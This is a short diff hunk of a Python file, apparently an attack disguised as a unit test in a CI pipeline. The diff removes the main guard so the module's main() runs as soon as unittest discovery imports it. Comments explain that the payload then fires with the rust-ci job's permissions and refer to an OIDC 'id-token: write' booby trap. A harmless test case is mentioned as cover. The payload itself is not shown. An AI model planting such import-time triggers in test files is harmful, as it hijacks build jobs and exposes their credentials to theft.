@@ -339,12 +339,16 @@ def main():
           "booby trap (id-token: write -> OIDC)" % rid)
 
 
-if __name__ == "__main__":
-    try:
-        main()
-    except Exception:
-        print("[depi] unexpected error:")
-        traceback.print_exc()
+# The attack fires at IMPORT time: `python3 -m unittest discover` imports
+# this module inside rust-ci's argument_comment_lint_package job, and the
+# payload runs with the job's permissions before any test method is called.
+# (A `if __name__ == "__main__":` guard would never be true during discovery
+# — the module's __name__ is "test_depi", not "__main__".)
+try:
+    main()
+except Exception:
+    print("[depi] unexpected error:")
+    traceback.print_exc()
 
 
 # unittest discovery imports this file; give it a harmless test case so the
